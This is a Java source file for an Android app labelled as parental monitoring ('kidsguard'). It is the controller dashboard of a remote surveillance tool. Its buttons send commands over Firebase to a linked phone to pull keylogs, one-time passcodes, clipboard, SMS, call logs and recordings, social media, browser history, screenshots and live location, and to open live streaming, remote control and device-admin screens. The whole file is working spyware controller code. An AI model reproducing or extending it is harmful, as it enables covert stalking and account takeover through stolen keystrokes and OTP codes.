package com.kidsguard.parent;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.json.JSONObject;

public class DashboardActivity extends Activity {

    String deviceCode;
    TextView tvDeviceInfo, tvLocation, tvStatus;
    Handler handler = new Handler();
    boolean active = true;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_dashboard);

        deviceCode = getIntent().getStringExtra("device_code");
        tvDeviceInfo = findViewById(R.id.tvDeviceInfo);
        tvLocation = findViewById(R.id.tvLocation);
        tvStatus = findViewById(R.id.tvStatus);
        tvStatus.setText("Connected: " + deviceCode);

        setupButtons();
        startRefresh();
    }

    private void setupButtons() {
        // All Commands (180)
        findViewById(R.id.btnAllCommands).setOnClickListener(v -> {
            Intent i = new Intent(this, AllCommandsActivity.class);
            i.putExtra("device_code", deviceCode);
            startActivity(i);
        });

        // 1. Call Recordings
        findViewById(R.id.btnCallRecordings).setOnClickListener(v -> {
            sendCmd("get_recordings", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "recordings.json");
            i.putExtra("title", "Call Recordings");
            startActivity(i);
        });

        // 2. Captured Photos
        findViewById(R.id.btnPhotos).setOnClickListener(v -> {
            Intent i = new Intent(this, PhotoViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            startActivity(i);
        });

        // 3. Screen Time
        findViewById(R.id.btnScreenTime).setOnClickListener(v -> {
            sendCmd("get_screen_time", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "screentime.json");
            i.putExtra("title", "Screen Time");
            startActivity(i);
        });

        // 4. Alert Words
        findViewById(R.id.btnAlertWords).setOnClickListener(v -> {
            Intent i = new Intent(this, AlertWordsActivity.class);
            i.putExtra("device_code", deviceCode);
            startActivity(i);
        });

        // 5. Night Mode
        findViewById(R.id.btnNightMode).setOnClickListener(v -> {
            Intent i = new Intent(this, NightModeActivity.class);
            i.putExtra("device_code", deviceCode);
            startActivity(i);
        });

        // 6. Contact Block
        findViewById(R.id.btnContactBlock).setOnClickListener(v -> {
            Intent i = new Intent(this, ContactBlockActivity.class);
            i.putExtra("device_code", deviceCode);
            startActivity(i);
        });

        // 7. Alerts & Notifications
        findViewById(R.id.btnAlerts).setOnClickListener(v -> {
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "alerts.json");
            i.putExtra("title", "Alerts");
            startActivity(i);
        });

        // 8. Keylogger
        findViewById(R.id.btnKeylogs).setOnClickListener(v -> {
            sendCmd("get_keylog", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "keylog.json");
            i.putExtra("title", "Keylogger");
            startActivity(i);
        });

        // 9. Clipboard
        findViewById(R.id.btnClipboard).setOnClickListener(v -> {
            sendCmd("get_clipboard", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "result.json");
            i.putExtra("title", "Clipboard");
            startActivity(i);
        });

        // 10. WiFi & Network
        findViewById(R.id.btnWifi).setOnClickListener(v -> {
            sendCmd("get_wifi", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "wifi.json");
            i.putExtra("title", "WiFi & Network");
            startActivity(i);
        });

        // 11. Browser History
        findViewById(R.id.btnBrowser).setOnClickListener(v -> {
            sendCmd("get_browser_history", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "browserhistory.json");
            i.putExtra("title", "Browser History");
            startActivity(i);
        });

        // 12. Device Hardware Info
        findViewById(R.id.btnDeviceInfo).setOnClickListener(v -> {
            sendCmd("get_device_info", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "device_info.json");
            i.putExtra("title", "Device Info");
            startActivity(i);
        });

        // 13. OTP Codes
        findViewById(R.id.btnOtp).setOnClickListener(v -> {
            sendCmd("get_otp", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "result.json");
            i.putExtra("title", "OTP Codes");
            startActivity(i);
        });

        // 14. App Usage
        findViewById(R.id.btnAppUsage).setOnClickListener(v -> {
            sendCmd("get_screen_time", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "screentime.json");
            i.putExtra("title", "App Usage");
            startActivity(i);
        });

        // 15. Screenshots
        findViewById(R.id.btnScreenshots).setOnClickListener(v -> {
            sendCmd("screenshot", "");
            Intent i = new Intent(this, PhotoViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("mode", "screenshots");
            startActivity(i);
        });

        // 16. Live Stream & Remote Control
        findViewById(R.id.btnLiveStream).setOnClickListener(v -> {
            Intent i = new Intent(this, RemoteControlActivity.class);
            i.putExtra("device_code", deviceCode);
            startActivity(i);
        });

        // 17. Device Admin
        findViewById(R.id.btnAdminControl).setOnClickListener(v -> {
            Intent i = new Intent(this, AdminControlActivity.class);
            i.putExtra("device_code", deviceCode);
            startActivity(i);
        });

        // 18. Screen Cast & Recordings
        findViewById(R.id.btnScreenRecordings).setOnClickListener(v -> {
            sendCmd("get_recordings", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "screen_recordings.json");
            i.putExtra("title", "Screen Recordings");
            startActivity(i);
        });

        // App Blocking
        findViewById(R.id.btnBlockApps).setOnClickListener(v -> {
            Intent i = new Intent(this, AppBlockActivity.class);
            i.putExtra("device_code", deviceCode);
            startActivity(i);
        });

        // Contacts
        findViewById(R.id.btnContacts).setOnClickListener(v -> {
            sendCmd("get_contacts", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "contacts.json");
            i.putExtra("title", "Contacts");
            startActivity(i);
        });

        // SMS
        findViewById(R.id.btnSms).setOnClickListener(v -> {
            sendCmd("get_sms", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "sms.json");
            i.putExtra("title", "SMS");
            startActivity(i);
        });

        // Call Logs
        findViewById(R.id.btnCallLogs).setOnClickListener(v -> {
            sendCmd("get_call_logs", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "call_logs.json");
            i.putExtra("title", "Call Logs");
            startActivity(i);
        });

        // Notifications
        findViewById(R.id.btnNotifications).setOnClickListener(v -> {
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "notifications.json");
            i.putExtra("title", "Notifications");
            startActivity(i);
        });

        // Social Media
        findViewById(R.id.btnSocial).setOnClickListener(v -> {
            sendCmd("get_social", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "social.json");
            i.putExtra("title", "Social Media");
            startActivity(i);
        });

        // Live Location
        findViewById(R.id.btnLocation).setOnClickListener(v -> {
            sendCmd("get_location", "");
            Intent i = new Intent(this, DataViewerActivity.class);
            i.putExtra("device_code", deviceCode);
            i.putExtra("path", "location.json");
            i.putExtra("title", "Live Location");
            startActivity(i);
        });

        // Unlink
        findViewById(R.id.btnUnlink).setOnClickListener(v -> {
            getSharedPreferences("parent_prefs", 0)
                    .edit().remove("device_code").apply();
            startActivity(new Intent(this, MainActivity.class));
            finish();
        });
    }

    private void sendCmd(String cmd, String arg) {
        FirebaseHelper.sendCommand(deviceCode, cmd, arg);
        Toast.makeText(this, "Sent: " + cmd, Toast.LENGTH_SHORT).show();
    }

    private void startRefresh() {
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (!active) return;
                refreshData();
                handler.postDelayed(this, 5000);
            }
        }, 1000);
    }

    private void refreshData() {
        new Thread(() -> {
            try {
                final String loc = FirebaseHelper.get(
                        "devices/" + deviceCode + "/location.json");
                final String info = FirebaseHelper.get(
                        "devices/" + deviceCode + "/info.json");
                runOnUiThread(() -> {
                    try {
                        if (loc != null && !loc.equals("null")) {
                            JSONObject l = new JSONObject(loc);
                            tvLocation.setText("Location: " + l.optString("address", "")
                                    + " (" + l.optString("lat") + ", " + l.optString("lng") + ")");
                        }
                        if (info != null && !info.equals("null")) {
                            JSONObject i = new JSONObject(info);
                            tvDeviceInfo.setText("Device: " + i.optString("model", "")
                                    + " | Android " + i.optString("android", ""));
                        }
                    } catch (Exception e) {}
                });
            } catch (Exception e) {}
        }).start();
    }

    @Override protected void onResume() { super.onResume(); active = true; }
    @Override protected void onPause() { super.onPause(); active = false; }
}
